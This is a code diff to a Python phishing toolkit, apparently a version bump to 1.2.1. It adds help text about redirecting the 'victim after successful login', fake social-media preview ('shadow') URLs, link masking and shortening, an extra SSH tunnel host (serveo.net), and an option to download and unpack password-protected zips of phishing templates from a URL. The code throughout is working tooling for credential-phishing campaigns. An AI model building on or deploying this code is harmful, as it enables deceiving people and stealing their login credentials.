@@ -109,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.2.0"
+version="1.2.1"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -137,6 +137,20 @@ lx_help = f"""
 {blue}[2]{yellow} Create an account 
 {blue}[3]{yellow} Login to your account
 {blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
+"""
+shadow_help="""
+Shadow url is the url from which website previews are copied.
+When sending url through social media like facebook/telegram, 
+the previews are shown just below the url
+"""
+redir_help="""
+Redirection url is the url which is used to redirect victim after successful login
+"""
+curl_help="""
+Just a shortened url with your own masking
+"""
+zip_help="""
+Add more templates from a zip file which will be downloaded from input url
 """
 
 packages = [ "git", "php", "ssh" ]
@@ -598,14 +612,13 @@ def show_options(sites, is_main=True, is_login=False):
             options += optioner(i, 20) + "\n"
     options += "\n"
     if is_main:
-        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} More tools        {green}[{white}0{green}]{yellow} Exit\n\n"
+        options += f"{green}[{white}a{green}]{yellow} About     {green}[{white}o{green}]{yellow} AddZip  {green}       {green}[{white}m{green}]{yellow} More tools     {green}[{white}0{green}]{yellow} Exit\n\n"
     else:
         if is_login and isfile(saved_file) and cat(saved_file)!="":
             options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
         else:
             options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
     lolcat(options)
-
 # Clear the screen and show logo
 def clear(fast=False, lol=False):
     shell("clear")
@@ -749,7 +762,7 @@ def download(url, path):
 
 
 # Extract zip/tar/tgz files
-def extract(filename, extract_path='.'):
+def extract(filename, extract_path='.', pwd=None):
     directory = dirname(extract_path)
     newfile = filename.split(".")[0] if "." in filename else filename
     if directory!="" and not isdir(directory):
@@ -758,9 +771,17 @@ def extract(filename, extract_path='.'):
     try:
         if ".zip" in filename:
             with ZipFile(filename, 'r') as zip_ref:
-                if zip_ref.testzip() is None:
-                    zip_ref.extractall(extract_path)
-                else:
+                try:
+                    if pwd is None:
+                        zip_ref.extractall(extract_path)
+                    else:
+                        try:
+                            zip_ref.extractall(extract_path, pwd=bytes(pwd, "utf-8"))
+                        except:
+                            print(f"\n{error}Wrong password!")
+                            delete(filename)
+                            exit()
+                except:
                     print(f"\n{error}Zip file corrupted!")
                     delete(filename)
                     exit()
@@ -787,19 +808,39 @@ def get_media():
     return media_files
 
 def write_meta(url):
-    if url=="":
-        return
-    allmeta = get_meta(url)
-    if allmeta=="":
-        print(f"\n{error}URL isn't correct!")
-    write(allmeta, f"{site_dir}/meta.php")
+    while True:
+        if url is None or url == "":
+            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        else:
+            metaurl = url
+        if metaurl=="":
+            break
+        elif metaurl == "help":
+            sprint(shadow_help)
+        else:
+            allmeta = get_meta(metaurl)
+            if allmeta=="":
+                print(f"\n{error}No preview generated from specified URL!")
+            write(allmeta, f"{site_dir}/meta.php")
+            break
 
 
-def write_redirect(url):
-    global redir_url
-    if url == "":
-        url = redir_url
-    sed("redirectUrl", url, f"{site_dir}/login.php")
+def write_redirect():
+    global url, redir_url
+    while True:
+        if url is None or url == "":
+            redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        else:
+            redirect_url = url
+        if redirect_url is None or redirect_url == "":
+            redirect_url = redir_url
+            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
+            break
+        else:
+            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
+            break
+        if redirect_url == "help":
+            sprint(shadow_help)
 
 # Polite Exit
 def pexit():
@@ -840,17 +881,14 @@ def ssh_key():
     is_known = bgtask("ssh-keygen -F localhost.run").wait()
     if is_known != 0:
         shell(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts", True)
+    is_known2 = bgtask("ssh-keygen -F serveo.net").wait()
+    if is_known2 != 0:
+        shell(f"ssh-keyscan -H serveo.net >> {ssh_dir}/known_hosts", True)
 
 # Additional configuration for login phishing
 def set_login():
-    global url
-    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
-    write_meta(metaurl)
-    if url is not None:
-        redirect_url = url
-    else:
-        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
-    write_redirect(redirect_url)
+    write_meta(None)
+    write_redirect()
 
 # Additional configuration for image phishing
 def set_image():
@@ -881,6 +919,22 @@ def set_redirect(redir_url, write=False):
         if mask == "":
             mask = f'https://{sub("([/%+&?={} ])", "-", sub("https?://", "", website))}'
         sed("redirectUrl", website, f"{site_dir}/index.php")
+
+def add_zip():
+    while True:
+        zip_url = input(f"\n{ask}Enter the download url of zipfile: ")
+        if zip_url is None or zip_url == "":
+            sprint("{error}No URL specified")
+            break
+        elif zip_url=="help":
+            sprint(zip_help)
+        else:
+            download(zip_url, "sites.zip")
+            pwd = input(f"\n{ask}Enter the password of zipfile: ")
+            extract("sites.zip", sites_dir, pwd)
+            remove("sites.zip")
+            break
+
 
 
 # Output urls
@@ -1000,9 +1054,11 @@ def about():
 
 # Optional function for url masking
 def masking(url):
-    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
+    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help{green}] : {yellow}")
     if cust in [ "", "n", "N", "no" ]:
         return
+    if cust == "help":
+        print(curl_help)
     if (shortened:=shortener1(url)) != "":
         pass
     elif (shortened:=shortener2(url)) != "":
@@ -1243,15 +1299,15 @@ def main_menu():
         command = ts_commands[troubleshoot]
         shell(command)
         pexit()
-    tempdata = cat(templates_file)
-    if is_json(tempdata):
-        templates = parse(tempdata)
-    else:
-        sprint(f"\n{error}templates.json file is corrupted!")
-        exit(1)
-    names = list(templates.keys())
-    choices = [str(i) for i in range(1,len(names)+1)]
     while True:
+        tempdata = cat(templates_file)
+        if is_json(tempdata):
+            templates = parse(tempdata)
+        else:
+            sprint(f"\n{error}templates.json file is corrupted!")
+            exit(1)
+        names = list(templates.keys())
+        choices = [str(i) for i in range(1,len(names)+1)]
         clear(lol=True)
         show_options(names)
         if ptype is not None:
@@ -1268,6 +1324,8 @@ def main_menu():
             secondary_menu(templates[phishing_type], phishing_type)
         elif choice.lower()=="a":
             about()
+        elif choice.lower()=="o":
+            add_zip()
         elif choice.lower()=="s":
             saved()
         elif choice.lower()=="m":
@@ -1324,6 +1382,8 @@ def secondary_menu(sites, name):
             break
         elif choice.lower()=="a":
             about()
+        elif choice.lower()=="o":
+            add_zip()
         elif choice.lower()=="s":
             saved()
         elif choice.lower()=="x":
